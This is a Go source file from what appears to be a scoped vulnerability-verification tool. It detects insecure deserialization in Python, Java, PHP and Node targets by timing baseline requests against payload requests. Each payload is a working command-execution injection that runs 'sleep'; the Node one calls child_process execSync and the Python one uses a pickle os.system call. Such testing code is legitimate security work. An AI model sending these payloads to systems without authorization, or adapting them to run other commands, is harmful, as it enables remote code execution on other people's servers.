package verify

import (
	"fmt"
	"os"

	"github.com/srank/ensphere/internal/evidence"
)

// DeserializationConfig holds configuration for deserialization verification.
type DeserializationConfig struct {
	URL       string
	Runtime   string // java | python | php | node
	Method    string
	Technique string // time_based
	ProbeConfig
}

var deserPayloads = map[string]struct {
	contentType string
	baseline    string
	payloadFmt  string
}{
	"python": {
		contentType: "application/octet-stream",
		baseline:    "test",
		payloadFmt:  "cos\nsystem\n(S'sleep %d'\ntR.",
	},
	"java": {
		contentType: "application/x-java-serialized-object",
		baseline:    "test",
		payloadFmt:  "\xac\xed\x00\x05t\x00\x0fsleep %d\x00\x00",
	},
	"php": {
		contentType: "application/x-www-form-urlencoded",
		baseline:    "test",
		payloadFmt:  `O:8:"Shutdown":1:{s:4:"func";s:23:"sleep(%d)";}`,
	},
	"node": {
		contentType: "application/json",
		baseline:    `{"test": true}`,
		payloadFmt:  `{"rce":"_$$ND_FUNC$$_function(){require('child_process').execSync('sleep %d')}()"}`,
	},
}

var validDeserTechniques = map[string]bool{
	"time_based": true,
}

// VerifyDeserialization runs the deserialization verification probe.
func VerifyDeserialization(cfg DeserializationConfig) (*ProbeResult, error) {
	if err := CheckScope(cfg.URL, cfg.InScope); err != nil {
		return nil, err
	}

	if err := CheckMaxRisk(4, cfg.MaxRisk); err != nil {
		return nil, err
	}

	if !validDeserTechniques[cfg.Technique] {
		return nil, &ScopeError{Msg: fmt.Sprintf("unsupported technique %q — use: time_based", cfg.Technique)}
	}

	runtimeCfg, ok := deserPayloads[cfg.Runtime]
	if !ok {
		return nil, &ScopeError{Msg: fmt.Sprintf("unsupported runtime %q — use: java, python, php, node", cfg.Runtime)}
	}

	timer := NewTimer()
	throttle := NewThrottle(cfg.ThrottleMs)

	var ew *evidence.Writer
	if cfg.Evidence != "" {
		var err error
		ew, err = evidence.NewWriter(cfg.Evidence)
		if err != nil {
			fmt.Fprintf(os.Stderr, "Warning: could not open evidence file: %v\n", err)
		} else {
			defer ew.Close()
		}
	}

	if cfg.TimeoutSec < 5 {
		return nil, fmt.Errorf("timeout must be >= 5 for time-based probes, got %d", cfg.TimeoutSec)
	}
	sleepSec := cfg.TimeoutSec / 2
	if sleepSec < 3 {
		sleepSec = 3
	}
	if sleepSec > cfg.TimeoutSec-2 {
		sleepSec = cfg.TimeoutSec - 2
	}

	headers := make(map[string]string)
	for k, v := range cfg.Headers {
		headers[k] = v
	}
	headers["Content-Type"] = runtimeCfg.contentType

	probeCount := 0

	// Baseline probes
	var baselineRounds []RoundResult
	for i := 0; i < defaultRounds; i++ {
		throttle.Wait()
		probeCount++
		resp := HTTPProbe(cfg.Method, cfg.URL, runtimeCfg.baseline, headers, cfg.TimeoutSec)
		if resp.Error != nil {
			return nil, fmt.Errorf("baseline probe %d: %w", i+1, resp.Error)
		}
		baselineRounds = append(baselineRounds, RoundResult{
			StatusCode: resp.StatusCode,
			ElapsedMs:  resp.ElapsedMs,
			BodyHash:   resp.BodyHash,
			BodyLength: len(resp.Body),
		})
		fmt.Fprintf(os.Stderr, "[BASELINE %d] %dms\n", i+1, resp.ElapsedMs)
		writeEvidence(ew, "deserialization", cfg.Technique, cfg.URL, "", resp.StatusCode,
			fmt.Sprintf("%dms", resp.ElapsedMs), "baseline", fmt.Sprintf("round %d", i+1))
	}

	// Payload probes
	payload := fmt.Sprintf(runtimeCfg.payloadFmt, sleepSec)
	var payloadRounds []RoundResult
	for i := 0; i < defaultRounds; i++ {
		throttle.Wait()
		probeCount++
		resp := HTTPProbe(cfg.Method, cfg.URL, payload, headers, cfg.TimeoutSec)
		if resp.Error != nil {
			fmt.Fprintf(os.Stderr, "[PAYLOAD %d] error: %v\n", i+1, resp.Error)
			continue
		}
		payloadRounds = append(payloadRounds, RoundResult{
			StatusCode: resp.StatusCode,
			ElapsedMs:  resp.ElapsedMs,
			BodyHash:   resp.BodyHash,
			BodyLength: len(resp.Body),
		})
		fmt.Fprintf(os.Stderr, "[PAYLOAD %d] %dms\n", i+1, resp.ElapsedMs)
		writeEvidence(ew, "deserialization", cfg.Technique, cfg.URL, "", resp.StatusCode,
			fmt.Sprintf("%dms", resp.ElapsedMs), "payload", fmt.Sprintf("round %d, runtime=%s", i+1, cfg.Runtime))
	}

	if len(payloadRounds) == 0 {
		return nil, fmt.Errorf("all payload probes failed")
	}

	baselineAvg := avgFromRounds(baselineRounds)
	payloadAvg := avgFromRounds(payloadRounds)

	return &ProbeResult{
		SchemaVersion: 2,
		VulnType:      "deserialization",
		Technique:     cfg.Technique,
		StartedAt:     timer.StartedAt(),
		ProbeCount:    probeCount,
		Duration:      timer.Elapsed(),
		Measurements: DeserializationMeasurements{
			Runtime:        cfg.Runtime,
			BaselineRounds: baselineRounds,
			PayloadRounds:  payloadRounds,
			BaselineAvgMs:  baselineAvg,
			PayloadAvgMs:   payloadAvg,
			DeltaMs:        payloadAvg - baselineAvg,
			PayloadUsed:    payload,
		},
	}, nil
}
